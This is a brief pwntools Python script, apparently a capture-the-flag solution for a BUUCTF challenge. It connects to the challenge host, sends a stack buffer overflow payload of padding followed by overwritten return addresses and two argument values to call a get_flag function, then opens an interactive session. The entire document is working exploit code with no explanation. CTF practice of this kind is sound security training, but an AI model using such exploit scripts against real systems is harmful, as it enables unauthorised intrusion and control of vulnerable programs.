from pwn import *
sh = remote("node5.buuoj.cn",25043)
get_flag = 0x80489a0
exit_ad = 0x804E6A0
a1=0x308CD64F
a2=0x195719D1
payload = b"A"*0x38+ p32(get_flag)+p32(exit_ad)+p32(a1)+p32(a2)
sh.sendline(payload)
sh.interactive()
